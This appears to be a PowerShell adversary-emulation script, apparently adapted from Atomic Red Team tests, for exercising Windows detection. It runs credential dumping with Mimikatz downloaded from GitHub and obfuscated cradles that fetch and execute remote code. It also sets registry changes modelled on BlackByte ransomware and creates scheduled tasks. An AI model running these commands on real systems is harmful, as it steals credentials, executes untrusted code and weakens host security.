# By Threats Experts University
 
 # Changing security protocol to TLS 1.2 to install modules
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Attackers need to change the powershell execution policy in order to run their malicious powershell scripts
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine

# Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds

Start-Sleep -Seconds 5

# Different obfuscated methods to test. 
# Upon execution, reaches out to bit.ly/L3g1t and displays: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))

# Writes text to a file and display the results. 
# This test is intended to emulate the dropping of a malicious file to disk.
cmd.exe /c "echo `"Injection success.`" > `"%TEMP%\test.bin`" & type `"%TEMP%\test.bin`""

# Visual Basic execution test, execute vbscript via PowerShell.
# When successful, system information will be written to $env:TEMP\T1059.005.out.txt.
New-Item -ItemType Directory (Split-Path $env:TEMP\sys_info.vbs) -Force | Out-Null
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.005/src/sys_info.vbs" -OutFile "$env:TEMP\sys_info.vbs"
cscript $env:TEMP\sys_info.vbs > $env:TEMP\T1059.005.out.txt

# emulate malware authors utilizing well known techniques to extract data from memory/binary files. 
# To do this we first create a string in memory then pull out the pointer to that string. 
# Finally, it uses this pointer to copy the contents of that memory location to a file stored in the $env:TEMP\atomic_t1059_005_test_output.bin.
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.005/src/T1059_005-macrocode.txt" -OutFile "$env:TEMP\T1059_005-macrocode.txt" 
Invoke-Maldoc -macroFile "$env:TEMP\T1059_005-macrocode.txt" -officeProduct "Word" -sub "Extract"

# Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1106/src/CreateProcess.cs" -OutFile "$env:TEMP\CreateProcess.cs" 
cmd.exe /c  "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:`"%tmp%\T1106.exe`" /target:exe $env:TEMP\CreateProcess.cs"
cmd.exe /c  "%tmp%/T1106.exe"

Start-Sleep -Seconds 5

#  utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute "notepad.exe" within 30 - 40 seconds after this module has run
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1053.005/src/T1053.005-macrocode.txt" -OutFile "$env:TEMP\T1053.005-macrocode.txt"
Invoke-MalDoc -macroFile "$env:TEMP\T1053.005-macrocode.txt" -officeProduct "Word" -sub "Scheduler"

Start-Sleep -Seconds 45

# Create a scheduled task with an action and modify the action to do something else
# It will first be created to spawn cmd.exe, but modified to run notepad.exe
$Action = New-ScheduledTaskAction -Execute "cmd.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTaskModifed -InputObject $object
$NewAction = New-ScheduledTaskAction -Execute "Notepad.exe"
Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction

Start-Sleep -Seconds 5

# This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force
New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force

Start-Sleep -Seconds 5

# Query Windows Registry. Upon successful execution, cmd.exe will perform multiple reg queries. 
# Some will succeed and others will fail (dependent upon OS)
cmd.exe /c "reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows`""
cmd.exe /c  "reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
cmd.exe /c  "reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
cmd.exe /c  "reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices"
cmd.exe /c  "reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices"
cmd.exe /c  "reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify`""
cmd.exe /c "reg query `"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`""
cmd.exe /c "reg query `"HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell`""
cmd.exe /c  "reg query `"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell`""
cmd.exe /c  "reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad"
cmd.exe /c "reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
cmd.exe /c  "reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx"
cmd.exe /c "reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
cmd.exe /c  "reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
cmd.exe /c "reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
cmd.exe /c  "reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
cmd.exe /c  "reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
cmd.exe /c  "reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri `".*\.sys$`""
cmd.exe /c  "reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

Start-Sleep -Seconds 2

# Downloads an image from a URL and sets it as the desktop wallpaper
$url = "https://i.kym-cdn.com/entries/icons/original/000/021/807/ig9OoyenpxqdCQyABmOQBZDI0duHk2QZZmWg2Hxd4ro.jpg"
$imgLocation = "$env:TEMP\new.png"
$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\Control Panel\Desktop\' -Name WallPaper).WallPaper
$orgWallpaper | Out-File -FilePath "$env:TEMP\old.png"
$updateWallpapercode = @'
using System.Runtime.InteropServices;
namespace Win32{

     public class Wallpaper{
         [DllImport("user32.dll", CharSet=CharSet.Auto)]
          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;

          public static void SetWallpaper(string thePath){
             SystemParametersInfo(20,0,thePath,3);
         }
     }
 }
'@
 $wc = New-Object System.Net.WebClient
 try{
     $wc.DownloadFile($url, $imgLocation)
     add-type $updateWallpapercode
     [Win32.Wallpaper]::SetWallpaper($imgLocation)
 }
 catch [System.Net.WebException]{
     Write-Host("Cannot download $url"+ [System.Net.WebException])
     add-type $updateWallpapercode
     [Win32.Wallpaper]::SetWallpaper($imgLocation)
 }
 finally{
     $wc.Dispose()
}
